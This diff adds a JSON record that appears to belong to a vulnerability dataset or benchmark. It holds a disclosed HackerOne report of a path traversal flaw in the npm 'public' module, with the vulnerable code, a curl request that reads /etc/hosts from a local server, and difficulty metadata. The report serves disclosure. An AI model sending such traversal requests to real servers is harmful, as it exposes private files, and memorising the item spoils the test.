@@ -1,0 +1,42 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "bl4de ",
+  "title": "[public] Path Traversal allows to read content of arbitrary files",
+  "content": "\nHi Guys,\nThere is Path Traversal in public module.\nIt allows to read content of arbitrary files on the remote server.\nModule\npublic\nRun static file hosting server with specified public dir & port. Support a \"direcotry index\" like Apache httpd.\nhttps://www.npmjs.com/package/public\nversion: 0.1.2\nStats\n3 downloads in the last day\n30 downloads in the last week\n384 downloads in the last month\n~4600 estimated downloads per year\nDescription\nLack of file path sanitization causes that any file on the server might be read by malicious user.\nVulnerability exists, because path is used without any check against Path Traversal attacks:\nCode 487 Bytes\n1// node_modules/public/bin/public, line 73:\n2    var pathname = url.parse(req.url).pathname;\n3    var filePath = path.join(dir, pathname); // Real file path\n4    var base = filePath.replace(dir, ''); // Base path for browser link\n5    var abs = path.resolve(filePath); \n6    console.log(new Date().toString(), abs);\n7    fs.readFile(filePath, function(err, data) {\n8      if (err) {\n9        (...)\n10      }\n11      res.writeHead(200, { 'Content-Type': mime.lookup(filePath) });\n12      res.end(data);\nAs you can notice, filePath is used directly, as read from url.\nSteps To Reproduce:\ninstall public:\nCode 20 Bytes\n1$ npm install public\nrun public in direcotry of your choice:\nCode 163 Bytes\n1me:~/playground/hackerone/Node$ ./node_modules/public/bin/public ./ 8080\n2Public.js server running with \"/home/rafal.janicki/playground/hackerone/Node\" on port 8080\nexecute following curl command (adjust number of ../ to reflect your system):\nCode 69 Bytes\n1$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts\nsee result:\nCode 610 Bytes\n1*   Trying 127.0.0.1...\n2* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\n3> GET /../../../../../etc/hosts HTTP/1.1\n4> Host: 127.0.0.1:8080\n5> User-Agent: curl/7.47.0\n6> Accept: */*\n7> \n8< HTTP/1.1 200 OK\n9< last-modified: Tue, 23 Jan 2018 14:51:52 GMT\n10< content-length: 188\n11< content-type: application/octet-stream\n12< Date: Tue, 06 Feb 2018 15:40:51 GMT\n13< Connection: keep-alive\n14< \n15127.0.0.1\tlocalhost\n16127.0.1.1\tLT0081U2\n17\n18# The following lines are desirable for IPv6 capable hosts\n19::1     localhost ip6-localhost ip6-loopback\n20ff02::1 ip6-allnodes\n21ff02::2 ip6-allrouters\n22* Connection #0 to host 127.0.0.1 left intact\nSupporting Material/References:\nUbuntu 16.04 LTS\nChromium 66.0.3333.0 (Developer Build) (64-bit)\nNode.js version: v8.9.4 LTS\nnpm version: 5.6.0\ncurl 7.47.0\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\nRegards,\nRafal 'bl4de' Janicki\nImpact\nThis vulnerability allows to read content of arbitrary files from the server where module is run.\n\n",
+  "severity": [
+    8.6,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1518907440,
+  "report_url": "https://hackerone.com/reports/312918",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the 'public' module using npm: npm install public"
+    ],
+    [
+      2,
+      "Run the public server in a directory of your choice: ./node_modules/public/bin/public ./ 8080"
+    ],
+    [
+      3,
+      "Execute a curl command to exploit the path traversal: curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a Path Traversal issue in the 'public' module, which allows an attacker to read arbitrary files on the server due to lack of proper file path sanitization. The module directly uses the filePath from the URL without any checks against Path Traversal attacks, enabling access to sensitive files like /etc/hosts.",
+  "reason": "The vulnerability is straightforward to discover as it involves a common security flaw (Path Traversal) and does not require complex interactions or state manipulations. The attack is simple and leverages well-known techniques without any novel logic or subtle interactions between components.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null
+}
